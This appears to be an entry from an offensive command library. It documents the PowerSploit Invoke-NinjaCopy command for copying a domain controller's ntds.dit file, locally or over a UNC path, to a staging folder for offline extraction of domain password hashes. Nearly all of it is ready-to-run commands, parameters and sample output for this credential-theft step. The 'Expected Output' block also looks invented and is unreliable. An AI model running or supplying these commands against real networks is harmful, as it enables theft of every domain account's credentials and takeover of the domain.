---
id: d7b8db04-f694-40e8-8033-d1c3595c15db
name: invoke-ninjacopy-copy-ntds-dit
type: command
executor: powershell
data: >-
  Invoke-NinjaCopy -Path "c:\windows\NTDS\ntds.dit" -Verbose -LocalDestination
  "c:\temp\ntds.dit"
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - file-copy
  - ntds
  - powershell
verified: true
validated: true
---

# invoke-ninjacopy-copy-ntds-dit

## Command

```powershell
Invoke-NinjaCopy -Path "c:\windows\NTDS\ntds.dit" -Verbose -LocalDestination "c:\temp\ntds.dit"
```

## Description

This PowerShell command uses the Invoke-NinjaCopy function from PowerSploit to copy the NTDS.dit file from a remote or local domain controller to a specified local destination, enabling offline extraction of domain hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Path | Full path to the remote NTDS.dit file | Yes |
| -LocalDestination | Local path to save the copied file | Yes |
| -Verbose | Enable detailed logging of the copy process | No |

## Examples

### Basic Usage

```powershell
Invoke-NinjaCopy -Path "c:\windows\NTDS\ntds.dit" -LocalDestination "c:\temp\ntds.dit"
```

### Advanced Usage

```powershell
Invoke-NinjaCopy -Path "\\DC01\C$\windows\NTDS\ntds.dit" -Verbose -LocalDestination "c:\staged\ntds.dit"
```

## Expected Output

VERBOSE: Opening handle to \\.\pipe\lsarpc
VERBOSE: Copying file from remote path to local destination
VERBOSE: File copy completed successfully. Size: 52428800 bytes.

No errors; check local file existence and size to confirm.

## Related

- [[procedures/Dump-AD-Domain-Credentials-with-Hashdump-NinjaCopy-and-CME]]
- [[tools/PowerSploit]]
